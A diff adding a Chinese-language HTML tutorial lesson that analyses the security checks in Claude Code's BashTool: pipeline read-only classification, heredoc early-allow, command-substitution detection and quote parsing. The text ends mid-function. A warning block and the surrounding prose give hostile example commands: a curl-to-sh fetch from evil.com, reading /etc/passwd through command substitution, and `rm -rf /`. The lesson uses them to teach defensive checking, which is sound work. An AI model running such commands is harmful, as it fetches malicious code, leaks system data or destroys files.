@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>第06课：Shell 执行工具深度剖析 | Claude Code 教程</title>
+  <meta name="description" content="深度剖析 BashTool 的安全执行模型：多层检查链纵深防御、危险命令检测实现、管道识别算法与流式执行策略。" />
+
+  <link rel="stylesheet" href="../vendor/github.min.css" />
+  <link rel="stylesheet" href="../css/style.css" />
+  <script src="../vendor/highlight.min.js" defer></script>
+  <script src="../vendor/mermaid.min.js" defer></script>
+
+  <style>
+    .lesson-layout { display: grid; grid-template-columns: 260px 1fr; gap: 0; max-width: 1400px; margin: 0 auto; padding: 0; align-items: start; }
+    .lesson-toc { position: sticky; top: 76px; height: calc(100vh - 76px); overflow-y: auto; padding: var(--space-xl) var(--space-lg); border-right: 1px solid var(--border-subtle); background: var(--bg-secondary); scrollbar-width: thin; scrollbar-color: var(--border-subtle) transparent; }
+    .lesson-toc::-webkit-scrollbar { width: 4px; }
+    .lesson-toc::-webkit-scrollbar-track { background: transparent; }
+    .lesson-toc::-webkit-scrollbar-thumb { background: var(--border-subtle); border-radius: 2px; }
+    .toc-title { font-family: var(--font-code); font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent-cyan); margin-bottom: var(--space-md); }
+    .toc-list { display: flex; flex-direction: column; gap: 2px; }
+    .toc-item a { display: block; padding: 6px 10px; font-size: 13px; color: var(--text-secondary); border-radius: var(--radius-sm); border-left: 2px solid transparent; transition: all var(--transition-fast); line-height: 1.4; }
+    .toc-item a:hover { color: var(--accent-blue); background: #eff6ff; border-left-color: var(--accent-blue); }
+    .toc-item.active a { color: var(--accent-blue); background: #eff6ff; border-left-color: var(--accent-blue); font-weight: 600; }
+    .toc-item.sub a { padding-left: 22px; font-size: 12px; }
+    .lesson-main { padding: var(--space-2xl) var(--space-2xl) var(--space-3xl); min-width: 0; }
+    .content-section { margin-bottom: var(--space-3xl); }
+    .content-section:last-child { margin-bottom: 0; }
+    .arch-table { width: 100%; border-collapse: collapse; margin: var(--space-lg) 0; font-size: var(--font-size-sm); }
+    .arch-table th { background: #eff6ff; color: var(--accent-cyan); font-weight: 700; padding: 10px 16px; text-align: left; border-bottom: 1px solid var(--border-subtle); font-family: var(--font-code); font-size: 11px; letter-spacing: 0.06em; text-transform: uppercase; }
+    .arch-table td { padding: 10px 16px; border-bottom: 1px solid var(--border-subtle); color: var(--text-primary); vertical-align: middle; }
+    .arch-table tr:last-child td { border-bottom: none; }
+    .arch-table tr:hover td { background: #f8fafc; }
+    .arch-table code { font-family: var(--font-code); font-size: 12px; color: var(--accent-green); background: #f0fdf4; padding: 2px 6px; border-radius: 4px; }
+    .code-anno-table { width: 100%; border-collapse: collapse; font-size: var(--font-size-sm); margin-top: var(--space-md); }
+    .code-anno-table th { background: var(--bg-secondary); color: var(--accent-cyan); font-family: var(--font-code); font-size: 10px; letter-spacing: 0.08em; text-transform: uppercase; padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--border-subtle); }
+    .code-anno-table td { padding: 8px 12px; border-bottom: 1px solid var(--border-subtle); vertical-align: top; line-height: 1.6; }
+    .code-anno-table td:first-child { font-family: var(--font-code); font-size: 12px; color: var(--accent-orange); white-space: nowrap; min-width: 80px; }
+    .code-anno-table td:last-child { color: var(--text-secondary); }
+    .goal-list { display: flex; flex-direction: column; gap: var(--space-sm); margin-top: var(--space-lg); }
+    .goal-item { display: flex; align-items: flex-start; gap: var(--space-md); padding: var(--space-md) var(--space-lg); background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: var(--radius-md); font-size: var(--font-size-sm); line-height: 1.6; }
+    .goal-item .goal-num { font-family: var(--font-code); font-size: 11px; font-weight: 700; color: var(--accent-green); min-width: 24px; margin-top: 1px; }
+    .lesson-nav-footer { display: flex; justify-content: space-between; align-items: center; padding: var(--space-xl); border-top: 1px solid var(--border-subtle); margin-top: var(--space-3xl); gap: var(--space-md); flex-wrap: wrap; }
+    .nav-prev, .nav-next { display: flex; align-items: center; gap: var(--space-sm); padding: 10px 20px; border-radius: var(--radius-md); font-size: var(--font-size-sm); font-weight: 600; transition: all var(--transition-normal); border: 1px solid var(--border-subtle); color: var(--text-secondary); }
+    .nav-prev:hover, .nav-next:hover { border-color: var(--accent-blue); color: var(--accent-blue); background: #eff6ff; }
+    .nav-next { background: #eff6ff; color: var(--accent-blue); }
+    .nav-overview { font-size: var(--font-size-sm); color: var(--text-secondary); transition: color var(--transition-fast); }
+    .nav-overview:hover { color: var(--accent-blue); }
+    #progress-bar { background: var(--gradient-accent); }
+    @media (max-width: 1024px) { .lesson-layout { grid-template-columns: 1fr; } .lesson-toc { display: none; } .lesson-main { padding: var(--space-xl) var(--space-lg); } }
+    @media (max-width: 768px) { .lesson-main { padding: var(--space-lg); } }
+    p code, li code, td code { font-family: var(--font-code); font-size: 12px; background: #f0f2f5; color: #d73a49; padding: 2px 6px; border-radius: 4px; border: 1px solid var(--border-subtle); }
+    strong { color: var(--text-heading); }
+    em { color: var(--accent-cyan); font-style: normal; }
+    .content-h2 { font-size: var(--font-size-xl); font-weight: 800; color: var(--text-heading); letter-spacing: -0.02em; margin-bottom: var(--space-md); padding-bottom: var(--space-sm); border-bottom: 1px solid var(--border-subtle); }
+    .content-h3 { font-size: var(--font-size-lg); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-md); margin-top: var(--space-xl); }
+    .content-p { color: var(--text-secondary); line-height: 1.8; margin-bottom: var(--space-md); }
+  </style>
+</head>
+<body>
+
+<div id="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+
+<header>
+  <nav class="navbar" role="navigation" aria-label="主导航">
+    <a href="../index.html" class="nav-brand">
+      <div class="brand-icon" aria-hidden="true">⚡</div>
+      <span>Claude Code 教程</span>
+    </a>
+    <ul class="nav-links" role="list">
+      <li><a href="../index.html#phases">课程总览</a></li>
+      <li><a href="#concepts">核心概念</a></li>
+      <li><a href="#architecture">架构设计</a></li>
+      <li><a href="#sourcecode">源码走查</a></li>
+      <li><a href="#harness">Harness Engineering</a></li>
+    </ul>
+    <button class="nav-hamburger" aria-label="打开菜单" aria-expanded="false" aria-controls="nav-mobile-lesson">
+      <span></span><span></span><span></span>
+    </button>
+  </nav>
+  <nav class="nav-mobile" id="nav-mobile-lesson" aria-label="移动端导航">
+    <a href="../index.html#phases">← 返回总览</a>
+    <a href="#concepts">核心概念</a>
+    <a href="#architecture">架构设计</a>
+    <a href="#sourcecode">源码走查</a>
+    <a href="#harness">Harness Engineering</a>
+    <a href="#quiz">思考题</a>
+  </nav>
+</header>
+
+<div class="lesson-header">
+  <div class="container">
+    <nav class="lesson-breadcrumb" aria-label="面包屑导航">
+      <a href="../index.html">Claude Code 教程</a>
+      <span class="sep">/</span>
+      <span class="tag tag-blue">第二阶段 · 核心系统深度解析</span>
+      <span class="sep">/</span>
+      <span>第06课</span>
+    </nav>
+    <div class="hero-eyebrow" style="animation: none;">
+      <span>🔒</span>
+      <span>LESSON 06 · PHASE 02</span>
+    </div>
+    <h1 class="hero-title" style="animation: none; font-size: clamp(32px, 4vw, 52px);">
+      Shell 执行工具<br/>
+      <span class="gradient-text">深度剖析</span>
+    </h1>
+    <div class="lesson-meta">
+      <span class="tag tag-blue">第二阶段 · 核心系统深度解析</span>
+      <span class="tag tag-orange">⏱ 建议 120 分钟</span>
+      <span class="tag tag-purple">⭐⭐⭐⭐ 高级</span>
+      <span class="tag tag-green">BashTool · 安全检查链 · 纵深防御</span>
+    </div>
+    <div class="goal-list" style="max-width: 820px; margin-top: var(--space-xl);">
+      <div class="goal-item"><span class="goal-num">01</span><span>理解 BashTool 的安全执行模型：多层检查链如何构建纵深防御</span></div>
+      <div class="goal-item"><span class="goal-num">02</span><span>深入掌握危险命令检测的具体实现：命令替换、heredoc、Zsh 扩展等风险点</span></div>
+      <div class="goal-item"><span class="goal-num">03</span><span>了解 <code>isSearchOrReadBashCommand</code> 的管道识别算法：如何判断整条管道是否为只读操作</span></div>
+      <div class="goal-item"><span class="goal-num">04</span><span>理解 <code>bashCommandIsSafe</code> 的早期允许路径（early-allow）与普通检查路径的区别</span></div>
+      <div class="goal-item"><span class="goal-num">05</span><span>掌握执行结果处理策略：流式输出、截断、落盘、图像处理</span></div>
+    </div>
+  </div>
+</div>
+
+<div class="lesson-body" style="padding: 0; background: var(--bg-primary);">
+  <div class="lesson-layout">
+
+    <aside class="lesson-toc" aria-label="课程目录">
+      <div class="toc-title">课程目录</div>
+      <nav class="toc-list" aria-label="章节导航">
+        <div class="toc-item"><a href="#concepts">§1 核心概念</a></div>
+        <div class="toc-item sub"><a href="#concept-security-model">1.1 BashTool 安全模型</a></div>
+        <div class="toc-item sub"><a href="#concept-ui-classify">1.2 命令分类 UI 意义</a></div>
+        <div class="toc-item"><a href="#architecture">§2 架构设计</a></div>
+        <div class="toc-item sub"><a href="#arch-modules">2.1 模块分布</a></div>
+        <div class="toc-item sub"><a href="#arch-design">2.2 设计思想</a></div>
+        <div class="toc-item"><a href="#sourcecode">§3 源码走查</a></div>
+        <div class="toc-item sub"><a href="#code-classify">3.1 搜索/读取分类</a></div>
+        <div class="toc-item sub"><a href="#code-heredoc">3.2 安全 heredoc 早期允许</a></div>
+        <div class="toc-item sub"><a href="#code-cmd-sub">3.3 命令替换检测</a></div>
+        <div class="toc-item sub"><a href="#code-quote">3.4 引号提取三视图</a></div>
+        <div class="toc-item sub"><a href="#code-stream">3.5 流式执行与进度回调</a></div>
+        <div class="toc-item"><a href="#harness">§4 Harness Engineering</a></div>
+        <div class="toc-item"><a href="#quiz">§5 思考题与进阶</a></div>
+      </nav>
+    </aside>
+
+    <main class="lesson-main" id="lesson-content">
+
+      <!-- §1 核心概念 -->
+      <section class="content-section" id="concepts">
+        <div class="reveal">
+          <p class="section-label">Section 01</p>
+          <h2 class="content-h2">核心概念</h2>
+        </div>
+
+        <div id="concept-security-model" class="reveal">
+          <h3 class="content-h3">1.1 BashTool 的安全模型</h3>
+          <p class="content-p">
+            BashTool 是 Claude Code 中最复杂的工具，因为 Shell 命令的能力边界极广——从查看文件到删除系统目录，一条命令可以产生完全不同的影响。其安全模型分为<strong>三个层次</strong>：
+          </p>
+          <div class="mermaid-container reveal">
+            <div class="mermaid">
+graph TB
+  subgraph "第一层：输入理解"
+    Parse["命令解析\n(Tree-Sitter AST + 正则回退)"]
+    Classify["命令分类\n(search/read/list/write)"]
+  end
+  subgraph "第二层：安全检查链"
+    Empty["validateEmpty\n空命令允许"]
+    Incomplete["validateIncompleteCommands\n不完整命令询问"]
+    Heredoc["isSafeHeredoc\n安全 heredoc 早期允许"]
+    CmdSub["validateCommandSubstitution\n命令替换检测"]
+    Zsh["validateZshDangerousCommands\nZsh 危险命令"]
+    Redirect["validateRedirections\n重定向注入检测"]
+  end
+  subgraph "第三层：权限决策"
+    Rules["规则匹配\n(精确/前缀/通配)"]
+    ReadOnly["只读白名单\n(readOnlyValidation)"]
+    Classifier["AI 分类器\n(yoloClassifier)"]
+  end
+
+  Parse --> Classify
+  Classify --> Empty
+  Empty --> Incomplete
+  Incomplete --> Heredoc
+  Heredoc -- "安全模式，直接允许" --> Allow["允许执行"]
+  Heredoc -- "继续检查" --> CmdSub
+  CmdSub --> Zsh
+  Zsh --> Redirect
+  Redirect --> Rules
+  Rules --> ReadOnly
+  ReadOnly --> Classifier
+  Classifier --> Allow
+  Classifier --> Ask["询问用户"]
+  Classifier --> Deny["拒绝"]
+            </div>
+          </div>
+        </div>
+
+        <div id="concept-ui-classify" class="reveal">
+          <h3 class="content-h3">1.2 命令分类的 UI 意义</h3>
+          <p class="content-p">BashTool 会根据命令内容决定 UI 展示方式：</p>
+          <table class="arch-table">
+            <thead><tr><th>命令类型</th><th>UI 行为</th><th>示例</th></tr></thead>
+            <tbody>
+              <tr><td><strong>搜索命令</strong></td><td>折叠显示，标注"搜索"</td><td><code>grep -r pattern src/</code></td></tr>
+              <tr><td><strong>读取命令</strong></td><td>折叠显示，标注"读取"</td><td><code>cat file.txt</code></td></tr>
+              <tr><td><strong>目录列出</strong></td><td>折叠显示，标注"列出"</td><td><code>ls -la</code>、<code>tree</code></td></tr>
+              <tr><td><strong>写入命令</strong></td><td>完整展示，需用户确认</td><td><code>rm file</code>、<code>git commit</code></td></tr>
+              <tr><td><strong>无输出命令</strong></td><td>显示"完成"而非输出</td><td><code>mv a b</code>、<code>mkdir dir</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- §2 架构设计 -->
+      <section class="content-section" id="architecture">
+        <div class="reveal">
+          <p class="section-label">Section 02</p>
+          <h2 class="content-h2">架构设计与设计思想</h2>
+        </div>
+
+        <div id="arch-modules" class="reveal">
+          <h3 class="content-h3">2.1 BashTool 模块分布</h3>
+          <div class="mermaid-container">
+            <div class="mermaid">
+graph TB
+  subgraph "BashTool 核心"
+    BT["BashTool.tsx\n主体：执行流程、UI、输出映射"]
+  end
+  subgraph "安全与权限层"
+    BS["bashSecurity.ts\n危险模式检测（2593行）"]
+    BP["bashPermissions.ts\n权限规则匹配与建议"]
+    BCH["bashCommandHelpers.ts\n管道段级权限检查"]
+    PV["pathValidation.ts\n路径提取与危险路径阻断"]
+    ROV["readOnlyValidation.ts\n只读命令白名单"]
+  end
+  subgraph "辅助层"
+    SEM["commandSemantics.ts\n退出码语义（如 grep 无匹配非错误）"]
+    SED["sedEditParser.ts\nsed in-place 解析与预计算"]
+  end
+
+  BT --> BS
+  BT --> BP
+  BP --> BS
+  BP --> BCH
+  BP --> PV
+  BP --> ROV
+  BT --> SEM
+  BT --> SED
+            </div>
+          </div>
+        </div>
+
+        <div id="arch-design" class="reveal">
+          <h3 class="content-h3">2.2 四大设计思想</h3>
+
+          <div class="card reveal" style="margin-bottom: var(--space-lg); border-left: 4px solid var(--accent-blue);">
+            <div style="display: flex; align-items: flex-start; gap: var(--space-md);">
+              <div style="font-size: 32px; flex-shrink: 0;">🛡️</div>
+              <div>
+                <h4 style="font-size: var(--font-size-md); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-sm);">1. 纵深防御（Defense in Depth）</h4>
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">没有任何单一检查能覆盖所有危险场景。<code>bashSecurity.ts</code> 包含数十个独立的检查器，每个只负责检测一类风险。这种"检查链"设计确保：漏过一个检查，下一个会接住。</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="card reveal" style="margin-bottom: var(--space-lg); border-left: 4px solid var(--accent-green);">
+            <div style="display: flex; align-items: flex-start; gap: var(--space-md);">
+              <div style="font-size: 32px; flex-shrink: 0;">⚡</div>
+              <div>
+                <h4 style="font-size: var(--font-size-md); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-sm);">2. 早期允许路径（Early Allow Path）</h4>
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary);"><code>isSafeHeredoc</code> 是一个特殊的"早期允许"路径：如果命令匹配安全的 heredoc 模式，直接允许执行，<strong>跳过所有后续检查</strong>。早期允许路径必须"<strong>可证明安全</strong>（provably safe）"，而不只是"可能安全"。</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="card reveal" style="margin-bottom: var(--space-lg); border-left: 4px solid var(--accent-orange);">
+            <div style="display: flex; align-items: flex-start; gap: var(--space-md);">
+              <div style="font-size: 32px; flex-shrink: 0;">⚠️</div>
+              <div>
+                <h4 style="font-size: var(--font-size-md); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-sm);">3. 最坏情况假设（Worst Case Assumption）</h4>
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">当命令解析失败（Tree-Sitter 异常）时，不是"放过"而是"询问用户"。宁可误报也不漏报安全风险。</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="card reveal" style="margin-bottom: var(--space-lg); border-left: 4px solid var(--accent-purple);">
+            <div style="display: flex; align-items: flex-start; gap: var(--space-md);">
+              <div style="font-size: 32px; flex-shrink: 0;">🔍</div>
+              <div>
+                <h4 style="font-size: var(--font-size-md); font-weight: 700; color: var(--text-heading); margin-bottom: var(--space-sm);">4. 命令替换的根本性风险</h4>
+                <p style="font-size: var(--font-size-sm); color: var(--text-secondary);">反引号 <code>`</code> 和 <code>$()</code> 允许在命令参数中嵌入另一个命令的执行结果。如 <code>git commit -m "$(cat /etc/passwd)"</code> ——这让原本"无害"的 git 命令变成了数据泄露媒介。因此命令替换是最重要的检测目标之一。</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- §3 源码走查 -->
+      <section class="content-section" id="sourcecode">
+        <div class="reveal">
+          <p class="section-label">Section 03</p>
+          <h2 class="content-h2">关键源码深度走查</h2>
+        </div>
+
+        <!-- 3.1 命令分类 -->
+        <div id="code-classify" class="reveal">
+          <h3 class="content-h3">3.1 命令的搜索/读取分类（BashTool.tsx L60-170）</h3>
+          <div style="display: flex; gap: var(--space-sm); flex-wrap: wrap; margin-bottom: var(--space-md);">
+            <span class="pattern-badge">🔄 状态机遍历</span>
+            <span class="pattern-badge">📋 管道识别</span>
+            <span class="pattern-badge">🛡️ 保守判定</span>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header">
+              <div class="code-block-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
+              <span class="code-block-lang">TypeScript · src/tools/BashTool/BashTool.tsx</span>
+              <button class="code-copy-btn" aria-label="复制代码">复制</button>
+            </div>
+            <pre><code class="language-typescript">const BASH_SEARCH_COMMANDS = new Set([
+  'find', 'grep', 'rg', 'ag', 'ack', 'locate', 'which', 'whereis'
+])
+const BASH_READ_COMMANDS = new Set([
+  'cat', 'head', 'tail', 'less', 'more',
+  'wc', 'stat', 'file', 'strings', 'jq', 'awk', 'cut', 'sort', 'uniq', 'tr'
+])
+const BASH_LIST_COMMANDS = new Set(['ls', 'tree', 'du'])
+// 语义中性命令（不影响管道整体的 read/search 性质）
+const BASH_SEMANTIC_NEUTRAL_COMMANDS = new Set(['echo', 'printf', 'true', 'false', ':'])
+
+export function isSearchOrReadBashCommand(command: string): {
+  isSearch: boolean; isRead: boolean; isList: boolean
+} {
+  let partsWithOperators: string[]
+  try {
+    partsWithOperators = splitCommandWithOperators(command)
+  } catch {
+    // 命令语法不合法时，保守地返回"非读取"
+    return { isSearch: false, isRead: false, isList: false }
+  }
+
+  let hasSearch = false, hasRead = false, hasList = false
+  let hasNonNeutralCommand = false
+  let skipNextAsRedirectTarget = false
+
+  for (const part of partsWithOperators) {
+    if (skipNextAsRedirectTarget) { skipNextAsRedirectTarget = false; continue }
+    if (part === '&gt;' || part === '&gt;&gt;' || part === '&gt;&amp;') {
+      skipNextAsRedirectTarget = true; continue
+    }
+    if (['||', '&amp;&amp;', '|', ';'].includes(part)) continue
+
+    const baseCommand = part.trim().split(/\s+/)[0]
+    if (!baseCommand) continue
+    if (BASH_SEMANTIC_NEUTRAL_COMMANDS.has(baseCommand)) continue
+
+    hasNonNeutralCommand = true
+    const isPartSearch = BASH_SEARCH_COMMANDS.has(baseCommand)
+    const isPartRead = BASH_READ_COMMANDS.has(baseCommand)
+    const isPartList = BASH_LIST_COMMANDS.has(baseCommand)
+
+    // 关键：任一非只读命令出现，立即返回 false
+    if (!isPartSearch &amp;&amp; !isPartRead &amp;&amp; !isPartList) {
+      return { isSearch: false, isRead: false, isList: false }
+    }
+    if (isPartSearch) hasSearch = true
+    if (isPartRead) hasRead = true
+    if (isPartList) hasList = true
+  }
+
+  if (!hasNonNeutralCommand) return { isSearch: false, isRead: false, isList: false }
+  return { isSearch: hasSearch, isRead: hasRead, isList: hasList }
+}</code></pre>
+          </div>
+
+          <div class="accordion" data-group="code-anno-classify">
+            <div class="accordion-header" aria-expanded="false">
+              <span style="font-weight: 700; color: var(--text-heading);">📋 逐行解析（点击展开）</span>
+              <svg class="accordion-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="accordion-body">
+              <div class="accordion-content">
+                <table class="code-anno-table">
+                  <thead><tr><th>关键逻辑</th><th>设计意图</th></tr></thead>
+                  <tbody>
+                    <tr><td>splitCommandWithOperators</td><td>将 <code>cmd1 | cmd2 &amp;&amp; cmd3</code> 拆分为 <code>['cmd1', '|', 'cmd2', '&amp;&amp;', 'cmd3']</code></td></tr>
+                    <tr><td>重定向目标跳过</td><td><code>grep -r . &gt; output.txt</code> 中 <code>output.txt</code> 不是命令，需要跳过</td></tr>
+                    <tr><td>语义中性命令</td><td><code>ls dir &amp;&amp; echo "---"</code> 依然是只读（echo 是中性的）</td></tr>
+                    <tr><td>遇到非只读立即 false</td><td><code>cat file | rm -</code> 不能被折叠展示为"读取"</td></tr>
+                    <tr><td>hasNonNeutralCommand 检查</td><td>避免全是 echo 的命令被误识别为"搜索"</td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div class="callout callout-tip" style="margin-top: var(--space-lg);">
+            <div class="callout-title"><span>💡</span> 设计点评 — 管道命令的保守判定</div>
+            <p style="font-size: var(--font-size-sm); color: var(--text-secondary); margin-top: var(--space-sm); line-height: 1.8;">
+              <strong>好在哪里</strong>：整条管道里只要有一个非只读命令，整体就判定为"非只读"。就像接力赛——不管前面几棒跑多快，只要最后一棒是写操作，这场比赛就是"写操作"。这保证了 UI 折叠展示不会误把危险命令包装成"看起来安全"的样子。
+            </p>
+            <p style="font-size: var(--font-size-sm); color: var(--text-secondary); margin-top: var(--space-sm); line-height: 1.8;">
+              <strong>如果不这样做</strong>：<code>cat secret.txt | rm -rf /</code> 可能被折叠显示为"读取命令"，用户以为只是读文件，其实正在执行删除。保守判定虽然偶尔误判无害命令，但比漏判危险命令安全得多。
+            </p>
+          </div>
+        </div>
+
+        <!-- 3.2 heredoc -->
+        <div id="code-heredoc" class="reveal">
+          <h3 class="content-h3">3.2 安全 heredoc 的早期允许路径（bashSecurity.ts L288-450）</h3>
+          <div style="display: flex; gap: var(--space-sm); flex-wrap: wrap; margin-bottom: var(--space-md);">
+            <span class="pattern-badge">✅ 可证明安全</span>
+            <span class="pattern-badge">⚡ Early Allow</span>
+            <span class="pattern-badge">🔒 逐行验证</span>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header">
+              <div class="code-block-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
+              <span class="code-block-lang">TypeScript · src/tools/BashTool/bashSecurity.ts</span>
+              <button class="code-copy-btn" aria-label="复制代码">复制</button>
+            </div>
+            <pre><code class="language-typescript">/**
+ * 这是早期允许路径（EARLY-ALLOW PATH）：
+ * 返回 true 时 bashCommandIsSafe 直接返回 passthrough，跳过所有后续验证器。
+ *
+ * 唯一允许的模式：
+ *   [prefix] $(cat &lt;&lt;'DELIM'\n
+ *   [body lines]\n
+ *   DELIM\n
+ *   ) [suffix]
+ */
+function isSafeHeredoc(command: string): boolean {
+  if (!HEREDOC_IN_SUBSTITUTION.test(command)) return false
+
+  const heredocPattern =
+    /\$\(cat[ \t]*&lt;&lt;(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g
+
+  const safeHeredocs = []
+  let match
+  while ((match = heredocPattern.exec(command)) !== null) {
+    const delimiter = match[2] || match[3]
+    if (delimiter) {
+      safeHeredocs.push({
+        start: match.index,
+        operatorEnd: match.index + match[0].length,
+        delimiter,
+        isDash: match[1] === '-',   // &lt;&lt;- 模式（剥离前导 tab）
+      })
+    }
+  }
+
+  for (const { operatorEnd, delimiter, isDash } of safeHeredocs) {
+    const afterOperator = command.slice(operatorEnd)
+    const openLineEnd = afterOperator.indexOf('\n')
+    if (openLineEnd === -1) return false  // heredoc 必须换行
+
+    const openLineTail = afterOperator.slice(0, openLineEnd)
+    if (!/^[ \t]*$/.test(openLineTail)) return false  // 防止开头行注入
+
+    const bodyStart = operatorEnd + openLineEnd + 1
+    const bodyLines = command.slice(bodyStart).split('\n')
+
+    let closingLineIdx = -1
+    for (let i = 0; i &lt; bodyLines.length; i++) {
+      const rawLine = bodyLines[i]
+      const line = isDash ? rawLine.replace(/^\t*/, '') : rawLine
+      if (line === delimiter) {
+        closingLineIdx = i
+        const nextLine = bodyLines[i + 1]
+        if (!nextLine) return false
+        if (!nextLine.match(/^([ \t]*)\)/)) return false
+        break
+      }
+      if (line === `${delimiter})`) { closingLineIdx = i; break }
+    }
+
+    if (closingLineIdx === -1) return false
+  }
+
+  return safeHeredocs.length &gt; 0
+}</code></pre>
+          </div>
+
+          <div class="callout callout-tip" style="margin-top: var(--space-lg);">
+            <div class="callout-title"><span>💡</span> 设计原则：可证明安全（Provably Safe）</div>
+            <p style="font-size: var(--font-size-sm); color: var(--text-secondary); margin-top: var(--space-sm); line-height: 1.8;">
+              <strong>好在哪里</strong>：早期允许路径的验证极为严格——不是"通常安全"，而是能通过逻辑证明绝对安全。逐行匹配精确复现 bash 的行为（bash 在读到"分隔符独占一行"时立即关闭 heredoc），保证了安全检查与 bash 实际解析行为完全一致，没有正则的语义偏差。
+            </p>
+            <p style="font-size: var(--font-size-sm); color: var(--text-secondary); margin-top: var(--space-sm); line-height: 1.8;">
+              <strong>如果不这样做</strong>：使用 <code>[\s\S]*?</code> 非贪婪正则可能被攻击者绕过——构造特殊输入让正则"跳过"第一个分隔符，把危险命令误判为安全的 heredoc body。
+            </p>
+          </div>
+        </div>
+
+        <!-- 3.3 命令替换 -->
+        <div id="code-cmd-sub" class="reveal">
+          <h3 class="content-h3">3.3 命令替换检测（bashSecurity.ts 核心检查器）</h3>
+          <div class="code-block">
+            <div class="code-block-header">
+              <div class="code-block-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
+              <span class="code-block-lang">TypeScript · bashSecurity.ts · 命令替换检测</span>
+              <button class="code-copy-btn" aria-label="复制代码">复制</button>
+            </div>
+            <pre><code class="language-typescript">/**
+ * 检测命令替换（$() 和反引号）
+ * 风险：git commit -m "$(cat /etc/passwd)" 让安全命令变成数据泄露
+ */
+function validateCommandSubstitution(context: ValidationContext): PermissionResult {
+  const { fullyUnquotedContent, originalCommand } = context
+
+  // 检测 $() 形式的命令替换（引号外的）
+  if (fullyUnquotedContent.includes('$(')) {
+    return {
+      behavior: 'ask',
+      message: 'Command contains command substitution ($()). ' +
+               'This may execute arbitrary commands and could be dangerous.',
+    }
+  }
+
+  // 检测反引号形式的命令替换
+  if (hasUnescapedChar(fullyUnquotedContent, '`')) {
+    return {
+      behavior: 'ask',
+      message: 'Command contains backtick command substitution.',
+    }
+  }
+
+  return { behavior: 'passthrough', message: 'No command substitution found' }
+}</code></pre>
+          </div>
+
+          <div class="callout callout-warning" style="margin-top: var(--space-lg);">
+            <div class="callout-title"><span>⚠️</span> 为什么命令替换如此危险？</div>
+            <div class="code-block" style="margin-top: var(--space-md);">
+              <div class="code-block-header">
+                <div class="code-block-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
+                <span class="code-block-lang">Bash · 危险示例</span>
+              </div>
+              <pre><code class="language-bash"># 表面上是 git commit，实际上会先执行 cat /etc/passwd
+git commit -m "$(cat /etc/passwd)"
+
+# 表面上是删除临时文件，但 find 可能返回意外路径
+rm $(find / -name "*.bak")
+
+# 危险的变量注入
+MALICIOUS="$(curl evil.com/payload | sh)"
+echo "$MALICIOUS"</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3.4 引号提取 -->
+        <div id="code-quote" class="reveal">
+          <h3 class="content-h3">3.4 引号提取与未引用内容分析（bashSecurity.ts L128-188）</h3>
+          <div style="display: flex; gap: var(--space-sm); flex-wrap: wrap; margin-bottom: var(--space-md);">
+            <span class="pattern-badge">🔍 三视图解析</span>
+            <span class="pattern-badge">🛡️ 引号歧义消除</span>
+            <span class="pattern-badge">📊 精确安全检查</span>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header">
+              <div class="code-block-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
+              <span class="code-block-lang">TypeScript · bashSecurity.ts · 引号提取</span>
+              <button class="code-copy-btn" aria-label="复制代码">复制</button>
+            </div>
+            <pre><code class="language-typescript">type QuoteExtraction = {
+  withDoubleQuotes: string     // 保留双引号内容，去除单引号内容
+  fullyUnquoted: string        // 完全去除引号内容
+  unquotedKeepQuoteChars: string // 去除引号内容但保留引号字符本身
+}
+
+/**
+ * 设计意图：安全检查应在"引号外"的内容上进行。
+ * echo "hello $(whoami)" 中，$(whoami) 在双引号内 —— 仍会执行！
+ * echo 'hello $(whoami)' 中，$(whoami) 在单引号内 —— 不会执行！
+ */
+function extractQuotedContent(command: string): QuoteExtraction {
+  let withDoubleQuotes = '', fullyUnquoted = '', unquotedKeepQuoteChars = ''
+  let inSingleQuote = false, inDoubleQuote = false, escaped = false
+
+  for (let i = 0; i &lt; command.length; i++) {
+    const char = command[i]
+    if (escaped) {
+      escaped = false
+      if (!inSingleQuote) withDoubleQuotes += char
+      if (!inSingleQuote &amp;&amp; !inDoubleQuote) fullyUnquoted += char
+      continue
+    }
+    if (char === '\\' &amp;&amp; !inSingleQuote) { escaped = true; continue }
+    if (char === "'" &amp;&amp; !inDoubleQuote) {
+      inSingleQuote = !inSingleQuote
+      unquotedKeepQuoteChars += char; continue
+    }
+    if (char === '"' &amp;&amp; !inSingleQuote) {
+      inDoubleQuote = !inDoubleQuote
+      unquotedKeepQuoteChars += char; continue
+    }
+    if (!inSingleQuote) withDoubleQuotes += char
+    if (!inSingleQuote &amp;&amp; !inDoubleQuote) {
+      fullyUnquoted += char
